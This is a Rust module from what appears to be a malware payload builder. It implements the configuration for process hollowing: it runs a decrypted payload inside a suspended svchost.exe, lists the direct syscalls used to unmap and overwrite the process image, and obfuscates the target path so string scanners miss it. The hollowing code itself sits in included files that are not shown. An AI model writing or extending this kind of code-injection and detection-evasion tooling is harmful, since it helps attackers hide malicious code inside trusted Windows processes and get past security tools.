//! Process hollowing.
//!
//! Runs the decrypted payload inside a suspended, legitimate process
//! (`svchost.exe` by default) by unmapping its original image and replacing it
//! with the payload's image. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for process hollowing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Path of the process to create, suspend and hollow.
    #[serde(default = "default_target")]
    pub target: String,
}

/// Default target process for process hollowing.
pub fn default_target() -> String {
    r"C:\Windows\System32\svchost.exe".to_string()
}

/// Static metadata for process hollowing.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "process_hollowing",
    attck: &["T1055.012"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/process_hollowing/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: r#"technique: process_hollowing
target: "C:\\Windows\\System32\\svchost.exe""#,
    readme: include_str!("README.md"),
    syscalls: &[
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtUnmapViewOfSection",
    ],
    resolves_imports: true,
};

impl Params {
    /// Renders the process-hollowing stub fragment for these parameters.
    ///
    /// The per-build target path is substituted into the fragment's
    /// placeholder as code that rebuilds the string at runtime (using
    /// `strings`'s active strategy), so it does not appear in `strings`. The
    /// `ntdll.dll` / `NtUnmapViewOfSection` names moved to the syscall layer
    /// (`engine::syscalls`), which obfuscates them the same way.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let target_def = strings
            .obfuscate(&self.target)
            .render_stub_expr("hollow_target");
        DEF.stub_fragment
            .replace("$HOLLOW_TARGET_DEF$", &target_def)
    }
}

#[cfg(test)]
mod tests;
